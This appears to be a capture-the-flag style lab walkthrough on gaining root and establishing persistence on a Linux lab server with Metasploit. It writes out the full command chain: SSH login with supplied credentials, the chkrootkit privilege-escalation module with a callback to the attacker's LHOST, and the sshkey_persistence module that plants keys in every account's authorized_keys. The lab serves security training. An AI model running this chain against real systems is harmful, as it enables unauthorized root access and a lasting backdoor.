# Establishing Persistence On Linux

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5454–5520. Examples are lab-specific and need verification.

This lab delves into the techniques for establishing persistent access on a Linux system. Participants are tasked with exploiting a vulnerable Linux server target. Through a series of steps, including initial access, privilege escalation, and establishing persistence, this lab provides comprehensive training on maintaining long-term access to a compromised system.

In this lab, the target server is running a vulnerable Rootkit Scanner. This lab covers the process of establishing persistence on Linux with Metasploit. The target machine will be accessible at **demo.ine.local**.

**Objective:** Escalate to the root user on the target machine and retrieve the flag!

**SSH Login Credentials:**

| Username | Password | | jackie | password |

Tools: msf, bash, terminal , nmap

```bash
nmap -sS -sV demo.ine.local
# port 22 openssh

msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERNAME jackie
set PASSWORD password
exploit
#got meterpreter session
sessions -u 1

#we will first need to elevate our privileges on the Linux target.
#The target system has a vulnerable version of chkrootkit installed that is vulnerable to privilege escalation and can be exploited through the use of a Metasploit module.
use exploit/unix/local/chkrootkit
set SESSION 2
# In your case, the SESSION ID will be different.
#We will also need to set the path to the chkrootkit binary, this can be done by running the following command:
set CHKROOTKIT /bin/chkrootkit
set LHOST 192.84.46.2
exploit

#the module runs successfully and provides us with an elevated command shell session on the target system.
#We can also upgrade this command shell session to a meterpreter session by running the following command:

sessions -u 3
#Now that we have been able to elevate our privileges on the target system, we can begin exploring the process of establishing persistence.

#The best Metasploit module that can be used to establish persistent access on a Linux target is the sshkey_persistence module.
use post/linux/manage/sshkey_persistence
set SESSION 4
set CREATESSHFOLDER true
exploit
#the module runs successfully and will add a public SSH key to the authorized_keys file in the home directory of all user and service accounts.

#ssh private key
/root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt

#To use the private key, copy the key and save it as a new file, in this case, we will be saving it in the home directory of the root user on the Kali Linux system as ssh_key.
cp /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt ssh_key

#We will then need to assign the appropriate permissions to the file, this can be done by running the following commands:
chmod 0400 ssh_key
ssh -i ssh_key root@demo.ine.local
#We can now authenticate with the target using the private key via SSH by running the following command:

```

the authentication with the private key is successful and we have successfully been able to establish persistent access to the Linux target by adding our public key to the authorized_keys file of over user account, consequently allowing us to authenticate with the target via SSH without providing a password.

In this lab, we explored the process of establishing persistent access on a Linux target with Metasploit.
